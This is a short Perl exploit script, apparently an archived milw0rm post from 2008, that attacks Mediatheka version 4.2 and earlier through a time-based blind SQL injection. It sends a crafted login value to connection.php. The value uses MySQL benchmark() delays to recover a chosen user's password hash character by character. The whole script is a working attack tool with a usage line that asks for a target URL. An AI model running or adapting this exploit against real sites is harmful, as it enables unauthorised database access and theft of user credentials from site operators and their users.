#!/usr/bin/perl -w
# Mediatheka <= 4.2 Remote Blind SQL Injection Exploit
# by athos - staker[at]hotmail[dot]it

use strict;
use LWP::UserAgent;

my ($stop,$start,$hash);

my $domain = shift;
my $userid = shift or &usage;

my @chars = (48..57, 97..102);
my $substr = 1;
my $http = new LWP::UserAgent;


&usage unless $domain =~ /^http:\/\/(.+?)$/i and $userid =~ /^[0-9]$/;


sub send_request
{
     my $post = undef;
     my $host = $domain;
     my $param = shift @_ or die $!;

     $host .= "/connection.php?guest=false";
     $post = $http->post($host,[
                                 user      => $param,
                                 password  => 'anything'
                               ]);

}


sub give_char
{
     my $send = undef;
     my ($charz,$uidz) = @_;

     $send = "' or (select if((ascii(substring".
             "(password,$uidz,1))=$charz),".
             "benchmark(200000000,char(0)),".
            "0) from users where id=$userid)#";

     return $send;
}


for(1..32)
{
     foreach my $set(@chars)
     {
          my $start = time();

          send_request(give_char($set,$substr));

          my $stop = time();

         if($stop - $start > 6)
         {
              syswrite(STDOUT,chr($set));
              $hash .= chr($set);
              $substr++;
              last;
        }
    }
}

sub usage
{
     print "[?] Mediatheka <= 4.2 Remote Blind SQL Injection Exploit\n";
     print "[?] by athos - staker[at]hotmail[dot]it\n";
     print "[?] Usage: perl $0 http://[host/path] [id]\n";
     exit;
}

# milw0rm.com [2008-12-15]